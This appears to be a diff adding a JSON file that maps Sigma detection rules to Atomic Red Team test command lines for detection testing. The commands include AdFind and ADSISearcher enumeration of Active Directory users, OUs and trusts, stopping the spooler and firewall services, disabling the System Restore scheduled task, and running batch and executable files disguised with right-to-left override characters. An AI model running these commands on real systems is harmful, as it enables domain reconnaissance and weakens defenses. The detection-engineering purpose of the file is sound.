+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1069.002_9f4e344b-8434-41b3-85b1-d38f29d148d0_Enumerate_Active_Directory_Groups_with_ADSISearcher.evtx"
+        },
+        {
+          "technical": "T1087.002",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1087.002_e1ec8d20-509a-4b9a-b820-06c9b2da8eb7_Adfind_-_Enumerate_Active_Directory_User_Objects.evtx"
+        },
+        {
+          "technical": "T1087.002",
+          "commandline": "\"powershell.exe\" & {(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %%{if(([ADSI]\\\"\"$_\\\"\").gPlink){Write-Host \\\"\"[+] OU Path:\\\"\"([ADSI]\\\"\"$_\\\"\").Path;$a=((([ADSI]\\\"\"$_\\\"\").gplink) -replace \\\"\"[[;]\\\"\" -split \\\"\"]\\\"\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \\\"\"Policy Path[$i]:\\\"\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \\\"\"Policy Name[$i]:\\\"\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \\\"\"`n\\\"\" }}}",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1087.002_7ab0205a-34e4-4a44-9b04-e1541d1a57be_Enumerate_Linked_Policies_In_ADSISearcher_Discovery.evtx"
+        },
+        {
+          "technical": "T1087.002",
+          "commandline": "\"powershell.exe\" & {([adsisearcher]\\\"\"objectcategory=user\\\"\").FindAll(); ([adsisearcher]\\\"\"objectcategory=user\\\"\").FindOne()}",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1087.002_02e8be5a-3065-4e54-8cc8-a14d138834d3_Enumerate_Active_Directory_Users_with_ADSISearcher.evtx"
+        },
+        {
+          "technical": "T1482",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\"  -gcb -sc trustdmp",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1482_15fe436d-e771-4ff3-b655-2dca9ba52834_Adfind_-_Enumerate_Active_Directory_Trusts.evtx"
+        },
+        {
+          "technical": "T1482",
+          "commandline": "\"cmd.exe\" /c \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=organizationalUnit)",
+          "rule_title": "Renamed AdFind Execution",
+          "rule_uuid": "df55196f-f105-44d3-a675-e9dfb6cc2f2b",
+          "rule_level": "high",
+          "tags": "attack.discovery; attack.t1018; attack.t1087.002; attack.t1482; attack.t1069.002",
+          "match_count": "1.0",
+          "original_logfile": "T1482_d1c73b96-ab87-4031-bad8-0e1b3b8bf3ec_Adfind_-_Enumerate_Active_Directory_OUs.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "renamed-AdFind.exe"
+      ],
+      "counts": {
+        "atomic_rows": 11,
+        "json_commandlines": 1,
+        "total_commandlines": 12
+      }
+    },
+    "proc_creation_win_sc_stop_service": {
+      "rule_name": "proc_creation_win_sc_stop_service",
+      "rule_title": "Stop Windows Service Via Sc.EXE",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1489",
+          "commandline": "sc.exe  stop spooler",
+          "rule_title": "Stop Windows Service Via Sc.EXE",
+          "rule_uuid": "81bcb81b-5b1f-474b-b373-52c871aaa7b1",
+          "rule_level": "low",
+          "tags": "attack.impact; attack.t1489",
+          "match_count": "1.0",
+          "original_logfile": "T1489_21dfb440-830d-4c86-a3e5-2a491d5a8d04_Windows_-_Stop_service_using_Service_Controller.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "sc  stop mpssvc"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_schtasks_disable": {
+      "rule_name": "proc_creation_win_schtasks_disable",
+      "rule_title": "Disable Important Scheduled Task",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1490",
+          "commandline": "schtasks.exe  /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable",
+          "rule_title": "Disable Important Scheduled Task",
+          "rule_uuid": "9ac94dc8-9042-493c-ba45-3b5e7c86b980",
+          "rule_level": "high",
+          "tags": "attack.impact; attack.t1489",
+          "match_count": "1.0",
+          "original_logfile": "T1490_1c68c68d-83a4-4981-974e-8993055fa034_Windows_-_Disable_the_SR_scheduled_task.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "schtasks.exe  /Change /TN \"\\Microsoft\\Windows\\SystemRestore\\SR\" /disable"
+      ],
+      "counts": {
+        "atomic_rows": 1,
+        "json_commandlines": 1,
+        "total_commandlines": 2
+      }
+    },
+    "proc_creation_win_susp_right_to_left_override": {
+      "rule_name": "proc_creation_win_susp_right_to_left_override",
+      "rule_title": "Potential Defense Evasion Via Right-to-Left Override",
+      "sources": [
+        "data_atomic_redteam.xlsx",
+        "rule_commandlines.json"
+      ],
+      "atomic_redteam": [
+        {
+          "technical": "T1036.002",
+          "commandline": "C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\thaim\\Desktop\\evil_batchâ€®fdp.bat\" \"",
+          "rule_title": "Potential Defense Evasion Via Right-to-Left Override",
+          "rule_uuid": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
+          "rule_level": "high",
+          "tags": "attack.defense-evasion; attack.t1036.002",
+          "match_count": "1.0",
+          "original_logfile": "T1036.002_d7c03c7e-31cd-43c7-859a-ec053f73b23a_Masquerading__Right-to-Left_Override_Batch_File_Creation_and_Execution.evtx"
+        },
+        {
+          "technical": "T1036.002",
+          "commandline": "C:\\WINDOWS\\system32\\cmd.exe /c \"\"C:\\Users\\thaim\\Downloads\\evil_batchâ€®fdp.bat\" \"",
+          "rule_title": "Potential Defense Evasion Via Right-to-Left Override",
+          "rule_uuid": "ad691d92-15f2-4181-9aa4-723c74f9ddc3",
+          "rule_level": "high",
+          "tags": "attack.defense-evasion; attack.t1036.002",
+          "match_count": "1.0",
+          "original_logfile": "T1036.002_dac81590-8b63-4769-8b82-310beedc4f09_Masquerading__RTLO_Masqueraded_File_Download_and_Execution.evtx"
+        }
+      ],
+      "rule_commandlines_json": [
+        "\"C:\\Users\\administrator.SIGEN.000\\Annâ€®gepj.exe\""
+      ],
+      "counts": {
+        "atomic_rows": 2,
+        "json_commandlines": 1,
+        "total_commandlines": 3
+      }
+    }
+  }
+}
